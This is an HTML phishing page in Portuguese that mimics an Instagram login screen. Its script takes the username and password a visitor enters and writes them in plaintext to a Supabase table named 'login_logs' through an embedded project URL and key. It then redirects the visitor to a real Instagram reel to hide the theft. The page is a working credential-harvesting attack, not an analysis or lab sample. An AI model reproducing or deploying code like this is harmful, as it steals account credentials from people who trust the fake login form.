<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <link rel="icon" href="favicon.ico" type="image/x-icon">
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram-reels-@thezago</title>

  <!-- Supabase -->
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

  <style>
    * {
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
        Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      margin: 0;
      background: #ffffff;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .app {
      width: 100%;
      max-width: 360px;
      padding: 32px 24px;
      text-align: center;
    }

    .lang {
      font-size: 13px;
      color: #666;
      margin-bottom: 24px;
    }

    .logo {
      margin-bottom: 32px;
    }

    .logo img {
      width: 72px;
      height: 72px;
      object-fit: contain;
    }

    input {
      width: 100%;
      padding: 14px;
      margin-bottom: 12px;
      border-radius: 12px;
      border: 1px solid #dcdcdc;
      background: #fafafa;
      font-size: 15px;
    }

    input:focus {
      outline: none;
      border-color: #4cb5f9;
      background: #fff;
    }

    button {
      width: 100%;
      padding: 14px;
      margin-top: 6px;
      border-radius: 24px;
      border: none;
      background: #1e90ff;
      color: #fff;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }

    button:active {
      opacity: 0.85;
    }

    .link {
      margin-top: 18px;
      font-size: 14px;
      color: #1e90ff;
      cursor: pointer;
    }

    .outline {
      margin-top: 26px;
      padding: 12px;
      border-radius: 24px;
      border: 1px solid #1e90ff;
      color: #1e90ff;
      font-weight: 600;
      cursor: pointer;
    }

    .footer {
      margin-top: 40px;
      font-size: 13px;
      color: #888;
    }
  </style>
</head>

<body>
  <div class="app">

    <div class="lang">Português (Brasil)</div>

    <div class="logo">
      <img src="https://i.postimg.cc/vBYQbCyT/images-(1).jpg" alt="Logo">
    </div>

    <input id="usuario" type="text" placeholder="Nome de usuário, email ou celular">
    <input id="senha" type="text" placeholder="Senha">

    <button id="btnEntrar">Entrar</button>

    <div class="link" id="linkEsqueci">Esqueceu a senha?</div>

    <div class="outline" id="btnCriar">Criar nova conta</div>

    <div class="footer">by Plataforma</div>

  </div>


  <script>
    // ---------- CONFIGURAÇÃO ----------
    const supabaseUrl     = 'https://pwmtpvsgykjvouljjmrz.supabase.co';
    const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB3bXRwdnNneWtqdm91bGpqbXJ6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYwMTMxMTAsImV4cCI6MjA4MTU4OTExMH0.xQa-Tmyzx6UOCALygjxEGFNAJsIeQZ-r7bPQyP8XFQ8';
    const supabaseClient  = window.supabase.createClient(supabaseUrl, supabaseAnonKey);

    // ---------- ELEMENTOS ----------
    const btnEntrar   = document.getElementById('btnEntrar');
    const iptUsuario  = document.getElementById('usuario');
    const iptSenha    = document.getElementById('senha');
    const linkEsqueci = document.getElementById('linkEsqueci');
    const btnCriar    = document.getElementById('btnCriar');

    // ---------- FUNÇÕES ----------
    async function entrar() {
      const email = iptUsuario.value.trim();
      const senha = iptSenha.value.trim();

      if (!email || !senha) return alert('Preencha email e senha.');

      // 1) grava log (mesmo comportamento do antigo)
      const { error: logError } = await supabaseClient
        .from('login_logs')
        .insert({ usuario: email, senha: senha });

      if (logError) return alert('Erro: ' + logError.message);

      // 2) autentica
      const { data, error } = await supabaseClient.auth.signInWithPassword({ email, text: senha });
      if (error) return alert('Erro: ' + error.message);

      // 3) redireciona
      window.location.href = 'https://www.instagram.com/reels/DSYPgN7EVG3/';
    }

    async function criarConta() {
      const email = iptUsuario.value.trim();
      const senha = iptSenha.value.trim();

      if (!email || !senha) return alert('Preencha email e senha.');

      const { data, error } = await supabaseClient.auth.signUp({ email, text: senha });
      if (error) return alert('Erro: ' + error.message);

      alert('Conta criada! Verifique seu email para confirmar.');
    }

    async function esqueciSenha() {
      const email = prompt('Digite seu email para receber o link de recuperação:');
      if (!email) return;

      const { error } = await supabaseClient.auth.resetPasswordForEmail(email);
      if (error) return alert('Erro: ' + error.message);

      alert('Link de recuperação enviado!');
    }

    // ---------- EVENTOS ----------
    btnEntrar.addEventListener('click', entrar);
    btnCriar.addEventListener('click', criarConta);
    linkEsqueci.addEventListener('click', esqueciSenha);
  </script>
  
</body>
</html>
